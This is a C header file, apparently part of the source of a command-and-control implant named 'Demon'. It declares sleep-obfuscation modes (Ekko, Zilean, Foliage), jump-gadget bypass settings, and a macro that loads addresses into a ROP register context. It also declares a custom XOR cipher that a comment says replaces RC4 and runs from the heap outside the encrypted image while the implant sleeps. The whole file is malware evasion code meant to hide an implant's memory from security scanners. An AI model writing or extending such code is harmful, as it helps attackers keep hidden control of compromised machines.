
#ifndef DEMON_SLEEPOBF_H
#define DEMON_SLEEPOBF_H

#include <windows.h>

#define SLEEPOBF_NO_OBF  0x0
#define SLEEPOBF_EKKO    0x1
#define SLEEPOBF_ZILEAN  0x2
#define SLEEPOBF_FOLIAGE 0x3

#define SLEEPOBF_BYPASS_NONE 0
#define SLEEPOBF_BYPASS_JMPRAX 0x1
#define SLEEPOBF_BYPASS_JMPRBX 0x2

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {    \
        Rop[ i ].Rax = U_PTR( p );                  \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
        Rop[ i ].Rbx = U_PTR( & p );                \
    } else {                                        \
        Rop[ i ].Rip = U_PTR( p );                  \
    }

typedef struct
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING;

typedef struct _SLEEP_PARAM
{
    UINT32  TimeOut;
    PVOID   Master;
    PVOID   Slave;
} SLEEP_PARAM, *PSLEEP_PARAM;

/* Custom XOR cipher — replaces SystemFunction032 (RC4) for sleep obfuscation.
 * Copied to heap at init; executed from outside encrypted image during sleep. */
NTSTATUS WINAPI ObfXorCrypt( USTRING* Data, USTRING* Key );
NTSTATUS WINAPI ObfXorCryptEnd( VOID );

VOID SleepObf( );

#endif